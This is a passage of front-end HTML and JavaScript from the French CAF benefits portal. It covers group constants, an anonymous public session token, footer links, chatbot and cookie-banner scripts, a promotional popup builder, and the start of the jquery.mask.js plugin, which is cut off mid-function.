	CnafUserService.importConstante({"GROUP_ALLOCATAIRES_DTRSA": "allocatairesdtrsa"});CnafUserService.importConstante({"GROUP_ALLOCATAIRES_DPN": "allocatairesdpn"});CnafUserService.importConstante({"GROUP_ALLOCATAIRES_RSAPA_24_DERNIERS_MOIS": "allocatairesrsapa24derniersmois"});CnafUserService.importConstante({"GROUP_ALLOCATAIRES_AL": "allocatairesal"});CnafUserService.importConstante({"GROUP_ALLOCATAIRES_LOCATION_AL": "allocataireslocational"});CnafUserService.importConstante({"GROUP_ALLOCATAIRES_MAYOTTE": "allocatairesmayotte"});CnafUserService.importConstante({"GROUP_ALLOCATAIRES_EXPERIMENTATION_RMS": "allocatairesexperimentationrms"});CnafUserService.importConstante({"GROUP_ALLOCATAIRES_ACCESSION_AL": "allocatairesaccessional"});CnafUserService.importConstante({"GROUP_ALLOCATAIRES_SUSPENSION_DOSSIER": "allocatairessuspensiondossier"});CnafUserService.importConstante({"GROUP_ALLOCATAIRES_DRABS_ANNEEMOINS1_TTPERS": "allocatairesdrabsnmoins1toutespers"});CnafUserService.importConstante({"GROUP_ALLOCATAIRES_EXPERIMENTATION": "allocatairesexperimentation"});CnafUserService.importConstante({"GROUP_ALLOCATAIRES_AJPA": "allocatairesajpa"});CnafUserService.importConstante({"GROUP_ALLOCATAIRES_LOCATION_AL_SEUL": "allocataireslocationalseul"});CnafUserService.importConstante({"GROUP_ALLOCATAIRES_DOM": "allocatairesdom"});CnafUserService.importConstante({"GROUP_ALLOCATAIRES_EXPERIMENTATION_FORMULAIRE": "allocatairesexperimentationformulaire"});CnafUserService.importConstante({"GROUP_ALLOCATAIRES_AL_24_DERNIERS_MOIS": "allocatairesal24derniersmois"});CnafUserService.importConstante({"GROUP_ALLOCATAIRES_AL_SEUL": "allocatairesalseul"});CnafUserService.importConstante({"GROUP_ALLOCATAIRES_DTRPA": "allocatairesdtrpa"});CnafUserService.importConstante({"GROUP_ALLOCATAIRES_EXPERIMENTATION_AGENDA": "allocatairesexperimentationagenda"});CnafUserService.importConstante({"GROUP_ALLOCATAIRES_DSIT_BLOQUEE": "allocatairesdsitbloquee"});CnafUserService.importConstante({"GROUP_ALLOCATAIRES_AFFICHER_RESSOURCES": "allocatairesafficherressources"});CnafUserService.importConstante({"GROUP_ALLOCATAIRES_ETU_MAINTIEN_LOG": "allocatairesetumaintienlog"});CnafUserService.importConstante({"GROUP_ALLOCATAIRES_SIMULATION": "allocatairessimulation"});CnafUserService.importConstante({"GROUP_ALLOCATAIRES_EXPERIMENTATION_DELAIS_TRAITEMENT": "allocatairesexperimentationdelaistraitement"});CnafUserService.importConstante({"GROUP_ALLOCATAIRES_RADIES": "allocatairesradies"});CnafUserService.importConstante({"GROUP_ALLOCATAIRES_INSTITUTIONNEL": "allocatairesinstitutionnel"});CnafUserService.importConstante({"GROUP_ALLOCATAIRES_ENCOURS_AFFILIATION": "allocatairesafc"});CnafUserService.importConstante({"GROUP_ALLOCATAIRES_PATRIMOINE": "allocatairespatrimoine"});CnafUserService.importConstante({"GROUP_ALLOCATAIRES_DRABS_ANNEEMOINS2_TTPERS": "allocatairesdrabsnmoins2toutespers"});CnafUserService.importConstante({"GROUP_ALLOCATAIRES": "allocataires"});CnafUserService.importConstante({"GROUP_ALLOCATAIRES_EBO": "allocatairesebo"});CnafUserService.importConstante({"GROUP_ALLOCATAIRES_REMBOURSEMENTS": "allocatairesremboursements"});CnafUserService.importConstante({"GROUP_ALLOCATAIRES_RID": "allocatairesrecueilinformation"});CnafUserService.importConstante({"GROUP_ALLOCATAIRES_NEO_PRIMO": "allocatairesneoprimo"});CnafUserService.importConstante({"GROUP_ALLOCATAIRES_LOCATION_APL_SEUL": "allocataireslocationaplseul"});CnafUserService.importConstante({"GROUP_ALLOCATAIRES_DR": "allocatairesdr"});CnafUserService.importConstante({"GROUP_ALLOCATAIRES_CAFMIGREEMDP": "allocatairescafmigreemdp"});CnafUserService.importConstante({"GROUP_ALLOCATAIRES_DR_ANNEE_MOINS_2": "allocatairesdranneemoins2"});CnafUserService.importConstante({"GROUP_ALLOCATAIRES_AAHPA": "allocatairesaahpa"});CnafUserService.importConstante({"GROUP_ALLOCATAIRES_TUTELLE48": "allocatairestutelle48"});CnafUserService.importConstante({"GROUP_ALLOCATAIRES_DRABS_ANNEEMOINS2_ALLOCCJT": "allocatairesdrabsnmoins2alloccjt"});CnafUserService.importConstante({"GROUP_ALLOCATAIRES_AFFILIES": "allocatairesaff"});CnafUserService.importConstante({"GROUP_ALLOCATAIRES_ETUDIANT_UNIV": "allocatairesetudiantuniv"});CnafUserService.importConstante({"GROUP_ALLOCATAIRES_DRABS_ANNEEMOINS1_ALLOCCJT": "allocatairesdrabsnmoins1alloccjt"});CnafUserService.importConstante({"GROUP_ALLOCATAIRES_PAJEMPLOI": "allocatairespajeemploi"});CnafUserService.importConstante({"GROUP_ALLOCATAIRES_ETUDIANT": "allocatairesetudiant"});CnafUserService.importConstante({"GROUP_ALLOCATAIRES_ACCESSION_AL_SEUL": "allocatairesaccessionalseul"});CnafUserService.importConstante({"GROUP_ALLOCATAIRES_AAH": "allocatairesaah"});CnafUserService.importConstante({"GROUP_ALLOCATAIRES_CMAF": "allocatairescmaf"});CnafUserService.importConstante({"GROUP_ALLOCATAIRES_AAH_24_DERNIERS_MOIS": "allocatairesaah24derniersmois"});CnafUserService.importConstante({"GROUP_ALLOCATAIRES_ACCESSION_APL_SEUL": "allocatairesaccessionaplseul"});CnafUserService.importConstante({"GROUP_ALLOCATAIRES_APL_SEUL": "allocatairesaplseul"});

	CnafUserService.setCodeOrga("");
	CnafUserService.setMatricule("");
	CnafUserService.setDateEnvCaffr("20201211");
	CnafUserService.setTokenJWT("Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJhdWQiOiJ1cm46Y25hZjpmcmFtZXdvcms6c3VyZXRlIiwic3ViIjoicHJpbW8iLCJuYmYiOjE2MDc2NjAzNDc5NzQsInNjb3BlIjoicHVibGljIiwicm9sZXMiOltdLCJpc3MiOiJ1cm46Y25hZjpmcmFtZXdvcms6c3VyZXRlIiwiZXhwIjoxNjA3NjYwNjU3OTc0LCJpYXQiOjE2MDc2NjAzNTc5NzQsImRhdGVFbnZDYWZmciI6IjIwMjAxMjExIiwianRpIjoiMThiZjNlODEtMmMxZi00ZjliLTk0ZDYtNDkyMmNiOTcwMThhIiwiY2lkIjoiOWY5NGE4OTNmMTc2OWY2OWY3OTcwOTY3ZTAxMWMwZWM1MzFhYzMzYTE2MDRiOWU1YzBkMTRkNDIwMDAwOTU5MSJ9.gfaH4puqY3cLhkd1SMR4L_uRF2GfN_5mLoVEzfjb9dmibMHMaWIJ2OJIOI_tKYYlJVpxQkgmJux8a6x6P7zevXHF5HRgznt1i2Z42NkI2bca5OyBEmMUZrIt28zdBXsc6oEixzAhFI0v0GrjLemewY-Hv48LcL3-VJSQDSZ3yrhSpCEzbz4jRa3F8L3nG-ayuWR1skSIPHbal4BTH0FJ8ZbCdIEtVlTY7_YJdJDTKFFXBACoYLS42gzTqR_AMDzBYNwpIRWTrzUY0skV_ZJqReuRprfJ51iHq-LRxz_7xfEg2yoG90RKnWe86Qo2GZv5UoDaIky4szndlcnqZ8thew");
	CnafUserService.urlServletJwt = '/wps/s/GenerateTokenJwt/';
	
		CnafUserService.urlServletJwt = '/wps/s/GenerateTokenJwtPublic/';
	
	
}]);
</script>
<script src="js/configPortal.min.js?id=1607652163624"></script>
</div></div> 
</div>
				</div>
			</div>
		</div>
		
	</div>
</main>
			<!-- FIN CONTENU -->
				
		   
	
			<!-- DEBUT FOOTER -->
			    





	
	<footer id="theme-footer-cnaf" role="contentinfo"><div id="theme-footer-content">  <div class="container">    <div class="row">      <ul class="col-lg-4 col-sm-12 col-md-12 footer-list-link clearfix">        <li class="col-lg-12 col-sm-12 col-md-12 espace-footer">		   <a href="#">ESPACES</a>        </li>        <li class="col-lg-12 col-sm-6 col-md-6">          <ul>            <li class="li-footer ">              <a class="a-footer" href="http://www.caf.fr/allocataires">Allocataires</a>            </li>            <li class="li-footer ">              <a class="a-footer" href="http://www.caf.fr/partenaires">Partenaires</a>            </li>          </ul>        </li>        <li class="col-lg-12 col-sm-6 col-md-6">		   <ul>            <li class="li-footer ">              <a class="a-footer" href="http://www.caf.fr/presse-institutionnel">Presse et Institutionnel</a>            </li>		   </ul>		 </li>      </ul>      <ul class="col-lg-4 col-sm-12 col-md-12 footer-list-link clearfix">        <li class="col-lg-12 col-sm-12 col-md-12 espace-footer">		   <a href="#">INFORMATIONS</a>        </li>        <li class="col-lg-12 col-sm-6 col-md-6">          <ul>            <li class="li-footer ">              <a class="a-footer" href="http://www.caf.fr/allocataires/accessibilite">Accessibilité</a>            </li>            <li class="li-footer ">              <a class="a-footer" href="http://www.caf.fr/allocataires/mentions-legales">Mentions légales</a>            </li>            <li class="li-footer ">              <a class="a-footer" href="http://www.caf.fr/allocataires/plan-du-site">Plan du site</a>            </li>          </ul>        </li>        <li class="col-lg-12 col-sm-6 col-md-6">		   <ul>            <li class="li-footer ">              <a class="a-footer" href="http://www.caf.fr/redirect/s/Redirect?page=maCafContactCaf">Nous contacter</a>            </li>            <li class="li-footer ">              <a class="a-footer" href="http://www.lacafrecrute.fr/">Emploi et carrières</a>            </li>            <li class="li-footer ">              <a class="a-footer" href="http://www.caf.fr/allocataires/informatique-et-libertes">Informatique et Libertés</a>            </li>		   </ul>		 </li>      </ul>      <ul class="col-lg-4 col-sm-12 col-md-12 footer-list-link clearfix">        <li class="col-lg-12 col-sm-12 col-md-12 espace-footer">		   <a href="#">AUTRES SITES</a>        </li>        <li class="col-lg-12 col-sm-6 col-md-6">          <ul>            <li class="li-footer ">              <a class="a-footer" href="https://www.service-public.fr/">service-public.fr</a>            </li>            <li class="li-footer ">              <a class="a-footer" href="https://monenfant.fr/">monenfant.fr</a>            </li>            <li class="li-footer ">              <a class="a-footer" href="https://www.pension-alimentaire.caf.fr/">pension-alimentaire.caf.fr</a>            </li>          </ul>        </li>        <li class="col-lg-12 col-sm-6 col-md-6">		   <ul>            <li class="li-footer ">              <a class="a-footer" href="http://data.caf.fr/">data.caf.fr</a>            </li>            <li class="li-footer ">              <a class="a-footer" href="https://www.vacaf.org/">vacaf.org</a>            </li>            <li class="li-footer ">              <a class="a-footer" href="https://www.la-caf-a-votre-ecoute.caf.fr/">la-caf-a-votre-ecoute.caf.fr</a>            </li>		   </ul>		 </li>      </ul>    </div>  </div></div></footer>
	
	
	<div id="container-chatbot-cnaf"><div class="container text-right"><div class="row"><div id="iav" class="iav-small iav-replie" style="display: none;"></div></div></div></div><script type="text/javascript" >	var _iav = {		"base_path" : "/chatbotappli/dist/",		"debug" : false,       "title_text" : "<p>Bonjour, je suis votre conseiller virtuel.</p><p>Je connais déjà beaucoup de réponses à vos questions et j'apprends un peu plus chaque jour.</p>",		"display_auto" : false,		"inactivity_display_timer" : 15,		"service_url" : "/api/basedeconnaissancefront/v1/mon_compte/chatbot",		"authentifie" : false,		"code_organisme" : "null",		"public" : "usager"	};</script><link href="css/av.css?id=1607652162438" rel="stylesheet"><div id="container-sticky-camille-cnaf"><div class="container text-right">
		
	</div>
	

		<!-- Javascript CNAF -->
		<script src="js/footerCnaf.min.js?id=1607652162438"></script>
		<!-- Javascript CNAF -->
		<script>
			<!-- DEBUT Gestion Chatbot -->
			var isChatbotLoaded = 0;
			jQuery.cachedScript = function(url, options) {
				options = jQuery.extend( options || {}, {
					dataType: "script",
					cache: true,
					url: url
				});
				return jQuery.ajax(options);
			};
			function afficheChatbot(rubrique) {
				
					jQuery("#container-sticky-camille-cnaf").hide();
					jQuery("#iav").show();
			        if(rubrique != undefined){
			          _iav["rubrique"] = rubrique;
			        }
					if(isChatbotLoaded){
						return;
					} else {
						jQuery.cachedScript("/chatbotappli/dist/av.js?id=1607652162438")
							.done(function(data, textStatus, jqXHR){isChatbotLoaded = 1;})
							.fail(function(jqXHR, textStatus, errorThrown){
								console.log("Chargement fichier av.js KO : "+errorThrown);
							});
					}						
								
			}
			function cacheChatbot() {
				
					jQuery("#container-sticky-camille-cnaf").show();
					jQuery("#iav").hide();
				
			}
			<!-- FIN Gestion Chatbot -->
			<!-- DEBUT Gestion Navigation Privee -->
			<!-- TEST navigation privee Safari < 11  --> 
			function storageDisponible(type) {
				try {
					var storage = window[type];
					var x = 'storage_test';
					storage.setItem(x, x);
					storage.removeItem(x);
					return true;
				} catch(e) {
					return false;
				}
			}
			
			function acceptModeDegrade() {
				var date = new Date();
				date.setDate(date.getDate() + 100);
				document.cookie = "cookie-degrade=2; path=/; domain=.caf.fr; expires=" + date.toUTCString();
				jQuery("#bandeau-accept-degrade").slideUp("slow");
			}
			
			function afficheBandeauModeDegrade() {
				var statusCookies = getCookie("cookie-degrade");
				if (statusCookies == "") {
					jQuery("#bandeau-accept-degrade").slideDown("slow");
					jQuery("#bandeau-accept-degrade button.agree-button").bind('click', function(){
						acceptModeDegrade();
					});
				}
			}
			<!-- FIN TEST navigation privee Safari < 11 -->
			function getCookie(name) {
				var re = new RegExp(name + "=([^;]+)");
				var value = re.exec(document.cookie);
				return (value != null) ? unescape(value[1]) : "";
			}

			function afficheBandeauCookies(){
				var statusCookies = getCookie("cookie-agreed");
				if (statusCookies == "") {
					jQuery("#popup-accept-cookies").slideDown("slow");
					jQuery('a, input[type=submit], btn').bind('click.accept-cookies', function(){
						if (jQuery(this).hasClass("not-accept-cookies") == false) {
							acceptCookies();
						}
					});
					jQuery("#popup-accept-cookies button.agree-button").bind('click', function(){
						acceptCookies();
					});
				}
			}
			function acceptCookies() {
				var date = new Date();
				date.setDate(date.getDate() + 100);
				document.cookie = "cookie-agreed=2; path=/; domain=.caf.fr; expires=" + date.toUTCString();
			
				jQuery("#popup-accept-cookies").slideUp("slow", function() {});
				jQuery('a, input[type=submit], btn').unbind('click.accept-cookies');
			}
			
	

			$(document).ready(function(){
				
					pageReadyForTheme();
					afficheBandeauCookies();
					
					if (angular === undefined || angular.element === undefined || angular.module === undefined) {
						window.location.replace("https://www.caf.fr/navigateur-obsolete.html");
					}
					
					var localStorageDispo = storageDisponible('localStorage');
					var sessionStorageDispo = storageDisponible('sessionStorage');
					if(!localStorageDispo || !sessionStorageDispo) {
						// Affichage avertissement
						afficheBandeauModeDegrade();
					}
					
				
			});
		</script>
		

            <!-- FIN FOOTER -->
	       
			<!--
			<div id='popin'>
				<div id="popin-titre"></div>
				<p id='popin-contenu'> </p>
				<div class="barre-boutons" >
					<a class='bouton popin-btn-continuer' href='#' onclick='disablePopin("popin")'>Continuer</a>
					<a class='bouton popin-btn-annuler' href='#' onclick='disablePopin("popin")'>Annuler</a>
					<a class='bouton popin-btn-confirmer' href='#' onclick='disablePopin("popin")'>Confirmer</a>
				</div>
			</div>
			<div id='popin-background'>
			</div>	
			-->	
			
		<script>   
	       function gestionBoxPopupModaleProfileeTheme(namePropLocalStorage, nid)
				     {
					    
					    if ($('#caseAcocher-' + namePropLocalStorage).hasClass('glyphicon-ok')) 
					      { 
						  $('#caseAcocher-' + namePropLocalStorage).removeClass('glyphicon-ok');
						    // enlever le nid du localstorage
						    $('#caseAcocher-' + namePropLocalStorage).parent().attr('aria-checked', "false");
							localStorage.removeItem(namePropLocalStorage);
						  } 
						  else 
						  {
						    $('#caseAcocher-' + namePropLocalStorage).addClass('glyphicon-ok');
							// mettre le nid dans le localstorage
							localStorage.setItem(namePropLocalStorage, nid); 
							  $('#caseAcocher-' + namePropLocalStorage).parent().attr('aria-checked', "true");
						   }
						
				    }
				    
				    
        function affichePopupModaleProfileeTheme(response,portailVirtuelApplicationMobile)
        {
	          var displayPopupModalVideo = false;
	          var displayPopupModalImage = false;
	          var popupTrouve = false;
	          var typeclient = null;
	          //console.log(response);
	          for (var i = 0; i < response.popup_modale.length; i++) {
	              typeclient = response.popup_modale[i].type;
	              if (portailVirtuelApplicationMobile) {
	                  if (typeclient == "MCM") {
	                      reponse = response.popup_modale[i];
	                      popupTrouve = true;
	                      break;
	                  }
	
	              } else if (typeclient == "MCW") {
	                  reponse = response.popup_modale[i];
	                  popupTrouve = true;
	                  break;
	
	              }
	          }
	          if (popupTrouve)
	          {
	          var nidPopupModaleProfilee = reponse.id;
	          var titrePopup = reponse.titre;
	          var lienVideo = reponse.href_video;
	          var publication = reponse.publication;
	          var lienImage = reponse.grande_image;
	          var lienImageTablette = reponse.moyenne_image;
	          var lienImageMobile = reponse.petite_image;
	          var urlImage = reponse.url_image;
	          var codes_organismes = reponse.codes_organismes;
	          
	          if (portailVirtuelApplicationMobile) {
	          	// Hack pour palier au problème SSL des équipements Econocom pour www.caf.fr
	          	// TODO à supprimer lorsque le certificat de www.caf.fr sera dans un niveau de sécurité suffisant
	          	// (on pourra aussi enlever le hack côté bigip : https://wwwd.caf.fr/sites/default/files/cnaf/* ==> https://www.caf.fr/sites/default/files/cnaf)
	          	if (lienImage) {
	          		lienImage = lienImage.replace("https://www.caf.fr", "https://wwwd.caf.fr");
	          	}
	          	if (lienImageTablette) {
	          		lienImageTablette = lienImageTablette.replace("https://www.caf.fr", "https://wwwd.caf.fr");
	          	}
	          	if (lienImageMobile) {
	          		lienImageMobile = lienImageMobile.replace("https://www.caf.fr", "https://wwwd.caf.fr");
	          	}
	          }
	
	          if (lienVideo != null) {
	              // popup_modale vidéo
	              displayPopupModalVideo = true;
	          } else {
	              // popup modale image
	              displayPopupModalImage = true;
	          }
	          //console.log("id : " + nidPopupModaleProfilee)
	          //console.log("titre : "+titrePopup);
	          //console.log("lien  : "+lienVideo);
	          //console.log("groupe : "+publication);
	          //console.log("grande image : "+lienImage);
	          //console.log("moyenne image : " +lienImageTablette);
	          //console.log("petite image : "+lienImageMobile);
	          //console.log("lien image : "+ urlImage);
	          //console.log("codes_organismes : " +codes_organismes);
	          //console.log("type : "+typeclient);
			  if (urlImage == null )  urlImage = "";	
	
	          var nidPopupModaleProfileeInLocalStorage = localStorage.getItem('nidPopupModaleProfilee');
	          if (nidPopupModaleProfileeInLocalStorage != '' && nidPopupModaleProfilee != nidPopupModaleProfileeInLocalStorage)
	          {
	
	            if (displayPopupModalImage) {
	            	// Audit labellisation e-accessible
	               var popupTemplate = '<div id="modal-popup-promo" tabindex="-1" class="modal modal-vertical-align-center fade">'+
	                                    '  <div class="modal-dialog modal-dialog-popup" role="dialog" aria-labelledby="monTitreModal"> '+
	                                    '   <div class="modal-content"> '+
	                                    // Audit labellisation e-accessible
	                                    '     <div class="modal-header"> '+
	                                    '       <button type="button" class="close-cnaf" data-dismiss="modal" aria-label="Fermer la popup"></button>'+
	                                    '        <div role="heading" aria-level="4" class="texte-medium text-primary" id="monTitreModal">'+ titrePopup + '</div>' +
	                                    '      </div>'+
	                                    '      <div class="modal-body">'+
	                                    '			<div class="text-center">'+
	                                    (urlImage != "" ? '       <a href= "'+urlImage +'" target ="blank">' : '')+
	                                    '				<img src="' + lienImage + '" class="lien-image hidden-xs hidden-sm" alt="Image promotionnelle">'+
	                                    '				<img src="' + lienImageTablette + '" onerror="this.onerror=null;this.src=\'' + lienImage + '\'" class="lien-image-tablette hidden-xs hidden-md hidden-lg" alt="Image promotionnelle">'+
	                                    '				<img src="' + lienImageMobile + '" onerror="this.onerror=null;this.src=\'' + lienImage + '\'" class="lien-image-mobile hidden-sm hidden-md hidden-lg" alt="Image promotionnelle">'+
	                                    '				<span class="lien-image-mobile-fullscreen"><span class="glyphicon glyphicon-fullscreen visible-xs text-primary" onclick="$(\'#modal-popup-promo .lien-image-mobile\').click()"></span>'+
	                                    (urlImage != "" ? '       </a>' : '')+
	                                    '			</div>'+
	                                    '			<!--/p-->'+
	                                    '   </div>'+
	                                    // Audit labellisation e-accessible
	                                    '   <div class="modal-footer">'+
	                                    '       <div>'+
	                                    '      	  <label class="align-middle-cnaf checkbox-login-cnaf">'+
	                                    '         <button type=button  aria-labelledby="labelNePlusAfficher" class="pull-left btn btn-default cnaf-checkbox" role="checkbox" aria-checked="false" onClick="gestionBoxPopupModaleProfileeTheme(\'nidPopupModaleProfilee\', ' + nidPopupModaleProfilee + ');">'+
	                                    '         <span id="caseAcocher-nidPopupModaleProfilee" class="glyphicon" style="width:10px"></span></button>'+
	                                    ' 			  <span id="labelNePlusAfficher">Ne plus afficher</span>' +
	                                    ' 	      </label>'+
	                                    '        </div>'+
	                                    '        <button type="button" class="btn btn-default" data-dismiss="modal">Fermer</button>'+
	                                    '      </div>'+
	                                    '    </div>'+
	                                    '  </div>'+
	                                    '</div>';
	                $(popupTemplate).modal({backdrop: 'static', keyboard: false});
	
	            	
	            } else if (displayPopupModalVideo) {
	
	
	                    var popupTemplate = '<div id="modal-popup-promo-video" tabindex="-1" class="modal modal-vertical-align-center fade">'+
	                                        '  <div class="modal-dialog modal-dialog-popup" role="dialog" aria-labelledby="monTitreModal"> '+
	                                        '    <div class="modal-content">'+
	                                        // Audit labellisation e-accessible
	                                        '      <div class="modal-header"> '+
		                                    '       <button type="button" class="close-cnaf" data-dismiss="modal" aria-label="Fermer la popup"></button>'+
		                                    '        <div role="heading" aria-level="4" class="texte-medium text-primary" id="monTitreModal">'+ titrePopup + '</div>' +
		                                    '      </div>'+
	                                        '      <div class="modal-body">'+
	                                        '        <div class="embed-responsive embed-responsive-16by9">';
	                                        if (portailVirtuelApplicationMobile) {
	                        popupTemplate +='           <a class="embed-responsive-item btn btn-form-cnaf" href="'+ lienVideo.replace(".youtube-nocookie.com", ".youtube.com") + '">'+
	                                        '             <span class="glyphicon glyphicon-play-circle text-primary" aria-hidden="true"></span>'+
	                                        '             <span class="sr-only">Visualiser la vidéo</span>'+
	                                        '           </a>';
	                                        } else {
	                        popupTemplate +='           <iframe class="embed-responsive-item" src="'+ lienVideo + '" frameborder="0"></iframe>';
	                                        }
	                         // Audit labellisation e-accessible
	                        popupTemplate +='        </div>'+
	                                        '        <span class="visible-xs"></span>'+
	                                        '      </div>'+
	                                        '      <div class="modal-footer">'+
		                                    '       <div>'+
		                                    '      	  <label class="align-middle-cnaf checkbox-login-cnaf">'+
		                                    '         <button type=button  aria-labelledby="labelNePlusAfficher" class="pull-left btn btn-default cnaf-checkbox" role="checkbox" aria-checked="false" onClick="gestionBoxPopupModaleProfileeTheme(\'nidPopupModaleProfilee\', ' + nidPopupModaleProfilee + ');">'+
		                                    '         <span id="caseAcocher-nidPopupModaleProfilee" class="glyphicon" style="width:10px"></span></button>'+
		                                    ' 			  <span id="labelNePlusAfficher">Ne plus afficher</span>' +
		                                    ' 	      </label>'+
		                                    '        </div>'+
		                                    '        <button type="button" class="btn btn-default" data-dismiss="modal">Fermer</button>'+
	                                        '      </div>'+
	                                        '    </div>'+
	                                        '  </div>'+
	                                        '</div>';
	                                
	                    $(document).on('shown.bs.modal', '#modal-popup-promo-video', function() {
	                        popupVideoMinSizeForMobile();
	                        $(window).on('resize', popupVideoMinSizeForMobile);
	                    });
	                    $(document).on('hidden.bs.modal', '#modal-popup-promo-video', function() {
	                        popupVideoMinSizeForMobile();
	                        $(window).off('resize', popupVideoMinSizeForMobile);
	                        $('#modal-popup-promo-video').remove();
	                    });
	                    function popupVideoMinSizeForMobile() {
	                        if ($("#modal-popup-promo-video .modal-body .visible-xs").is(':visible')) {
	                            var dialogElement = $("#modal-popup-promo-video .modal-dialog");
	                            dialogElement.css("min-width", $(window).outerWidth(true) - (dialogElement.outerWidth(true) - dialogElement.outerWidth(false)));
	                        }
	                    }
	                    $(popupTemplate).modal({backdrop: 'static', keyboard: false});
	
	              }
	        }
	      }


        }
/**
         * jquery.mask.js
         * @version: v1.14.15
         * @author: Igor Escobar
         *
         * Created by Igor Escobar on 2012-03-10. Please report any bug at github.com/igorescobar/jQuery-Mask-Plugin
         *
         * Copyright (c) 2012 Igor Escobar http://igorescobar.com
         *
         * The MIT License (http://www.opensource.org/licenses/mit-license.php)
         *
         * Permission is hereby granted, free of charge, to any person
         * obtaining a copy of this software and associated documentation
         * files (the "Software"), to deal in the Software without
         * restriction, including without limitation the rights to use,
         * copy, modify, merge, publish, distribute, sublicense, and/or sell
         * copies of the Software, and to permit persons to whom the
         * Software is furnished to do so, subject to the following
         * conditions:
         *
         * The above copyright notice and this permission notice shall be
         * included in all copies or substantial portions of the Software.
         *
         * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
         * EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES
         * OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
         * NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT
         * HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY,
         * WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
         * FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR
         * OTHER DEALINGS IN THE SOFTWARE.
         */

        /* jshint laxbreak: true */
        /* jshint maxcomplexity:17 */
        /* global define */

        // UMD (Universal Module Definition) patterns for JavaScript modules that work everywhere.
        // https://github.com/umdjs/umd/blob/master/templates/jqueryPlugin.js

        (function (factory, jQuery, Zepto) {

            if (typeof define === 'function' && define.amd) {
                define(['jquery'], factory);
            } else if (typeof exports === 'object') {
                module.exports = factory(require('jquery'));
            } else {
                factory(jQuery || Zepto);
            }

        }(function ($) {
            'use strict';

            var Mask = function (el, mask, options) {

                var p = {
                    invalid: [],
                    getCaret: function () {
                        try {
                            var sel,
                                pos = 0,
                                ctrl = el.get(0),
                                dSel = document.selection,
                                cSelStart = ctrl.selectionStart;

                            // IE Support
                            if (dSel && navigator.appVersion.indexOf('MSIE 10') === -1) {
                                sel = dSel.createRange();
                                sel.moveStart('character', -p.val().length);
                                pos = sel.text.length;
                            }
                            // Firefox support
                            else if (cSelStart || cSelStart === '0') {
                                pos = cSelStart;
                            }

                            return pos;
                        } catch (e) {}
                    },
                    setCaret: function(pos) {
                        try {
                            if (el.is(':focus')) {
                                var range, ctrl = el.get(0);

                                // Firefox, WebKit, etc..
                                if (ctrl.setSelectionRange) {
                                    ctrl.setSelectionRange(pos, pos);
                                } else { // IE
                                    range = ctrl.createTextRange();
                                    range.collapse(true);
                                    range.moveEnd('character', pos);
                                    range.moveStart('character', pos);
                                    range.select();
                                }
                            }
                        } catch (e) {}
                    },
                    events: function() {
                        el
                            .on('keydown.mask', function(e) {
                                el.data('mask-keycode', e.keyCode || e.which);
                                el.data('mask-previus-value', el.val());
                                el.data('mask-previus-caret-pos', p.getCaret());
                                p.maskDigitPosMapOld = p.maskDigitPosMap;
                            })
                            .on($.jMaskGlobals.useInput ? 'input.mask' : 'keyup.mask', p.behaviour)
                            .on('paste.mask drop.mask', function() {
                                setTimeout(function() {
                                    el.keydown().keyup();
                                }, 100);
                            })
                            .on('change.mask', function(){
                                el.data('changed', true);
                            })
                            .on('blur.mask', function(){
                                if (oldValue !== p.val() && !el.data('changed')) {
                                    el.trigger('change');
                                }
                                el.data('changed', false);
                            })
                            // it's very important that this callback remains in this position
                            // otherwhise oldValue it's going to work buggy
                            .on('blur.mask', function() {
                                oldValue = p.val();
                            })
                            // select all text on focus
                            .on('focus.mask', function (e) {
                                if (options.selectOnFocus === true) {
                                    $(e.target).select();
                                }
                            })
                            // clear the value if it not complete the mask
                            .on('focusout.mask', function() {
                                if (options.clearIfNotMatch && !regexMask.test(p.val())) {
                                    p.val('');
                                }
                            });
                    },
                    getRegexMask: function() {
                        var maskChunks = [], translation, pattern, optional, recursive, oRecursive, r;

                        for (var i = 0; i < mask.length; i++) {
                            translation = jMask.translation[mask.charAt(i)];

                            if (translation) {

                                pattern = translation.pattern.toString().replace(/.{1}$|^.{1}/g, '');
                                optional = translation.optional;
                                recursive = translation.recursive;

                                if (recursive) {
                                    maskChunks.push(mask.charAt(i));
                                    oRecursive = {digit: mask.charAt(i), pattern: pattern};
                                } else {
                                    maskChunks.push(!optional && !recursive ? pattern : (pattern + '?'));
                                }

                            } else {
                                maskChunks.push(mask.charAt(i).replace(/[-\/\\^$*+?.()|[\]{}]/g, '\\$&'));
                            }
                        }

                        r = maskChunks.join('');

                        if (oRecursive) {
                            r = r.replace(new RegExp('(' + oRecursive.digit + '(.*' + oRecursive.digit + ')?)'), '($1)?')
                                .replace(new RegExp(oRecursive.digit, 'g'), oRecursive.pattern);
                        }

                        return new RegExp(r);
                    },
                    destroyEvents: function() {
                        el.off(['input', 'keydown', 'keyup', 'paste', 'drop', 'blur', 'focusout', ''].join('.mask '));
                    },
                    val: function(v) {
                        var isInput = el.is('input'),
                            method = isInput ? 'val' : 'text',
                            r;

                        if (arguments.length > 0) {
                            if (el[method]() !== v) {
                                el[method](v);
                            }
                            r = el;
                        } else {
                            r = el[method]();
                        }

                        return r;
                    },
                    calculateCaretPosition: function() {
                        var oldVal = el.data('mask-previus-value') || '',
                            newVal = p.getMasked(),
                            caretPosNew = p.getCaret();
                        if (oldVal !== newVal) {
                            var caretPosOld = el.data('mask-previus-caret-pos') || 0,
                                newValL = newVal.length,
                                oldValL = oldVal.length,
                                maskDigitsBeforeCaret = 0,
                                maskDigitsAfterCaret = 0,
                                maskDigitsBeforeCaretAll = 0,
                                maskDigitsBeforeCaretAllOld = 0,
                                i = 0;

                            for (i = caretPosNew; i < newValL; i++) {
                                if (!p.maskDigitPosMap[i]) {
                                    break;
                                }
                                maskDigitsAfterCaret++;
                            }

                            for (i = caretPosNew - 1; i >= 0; i--) {
                                if (!p.maskDigitPosMap[i]) {
                                    break;
                                }
                                maskDigitsBeforeCaret++;
                            }

                            for (i = caretPosNew - 1; i >= 0; i--) {
                                if (p.maskDigitPosMap[i]) {
                                    maskDigitsBeforeCaretAll++;
                                }
